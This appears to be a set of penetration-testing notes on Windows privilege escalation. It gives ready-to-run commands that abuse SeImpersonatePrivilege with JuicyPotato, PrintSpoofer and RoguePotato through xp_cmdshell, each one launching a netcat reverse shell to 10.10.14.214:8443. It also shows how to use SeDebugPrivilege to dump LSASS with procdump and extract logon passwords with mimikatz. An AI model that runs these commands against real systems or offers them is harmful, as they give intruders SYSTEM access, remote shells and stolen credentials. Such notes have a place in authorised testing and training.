#  SeImpersonate
```
xp_cmdshell whoami /priv
```
### Example
```
PRIVILEGES INFORMATION                                                             

----------------------                                                             

NULL                                                                               

Privilege Name                Description                               State      

============================= ========================================= ========   

SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   

SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   

SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    

SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled    

SeImpersonatePrivilege        Impersonate a client after authentication Enabled    

SeCreateGlobalPrivilege       Create global objects                     Enabled    

SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled 
```
To escalate privileges using these rights, let's first download the exploit binary and upload this and nc.exe to the target server. Next, stand up a Netcat listener on port 8443, and execute the command below where -l is the COM server listening port, -p is the program to launch (cmd.exe), -a is the argument passed to cmd.exe, and -t is the createprocess call. Below, we are telling the tool to try both the CreateProcessWithTokenW and CreateProcessAsUser functions, which need SeImpersonate or SeAssignPrimaryToken privileges respectively.
## JuicyPotato
https://github.com/ohpe/juicy-potato

```
xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.214 8443 -e cmd.exe" -t *
```
JuicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards. 
## PrintSpoofer
https://github.com/itm4n/PrintSpoofer

https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/
```
c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.214 8443 -e cmd"
```
## Rogue Potato
https://github.com/antonioCoco/RoguePotato
```
xp_cmdshell c:\tools\RoguePotato\RoguePotato.exe -r 10.10.14.214 -e "c:\tools\nc.exe 10.10.14.214 8443 -e cmd"
```
# SeDebugPrivilege
Verify permissions in cmd with admin
```
C:\Windows\system32>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeDebugPrivilege              Debug programs                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```
## Procdump
```
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
or
![image](https://user-images.githubusercontent.com/128841823/232630604-454078d5-aa14-4f0b-8843-c3b1b1bd163e.png)

transfer or direct mimikats to the lsass.dmp

## Mimikats
```
mimikatz.exe
```
```
mimikatz # log
```
```
sekurlsa::minidump lsass.dmp
```
```
sekurlsa::logonpasswords
```
also

https://decoder.cloud/2018/02/02/getting-system/
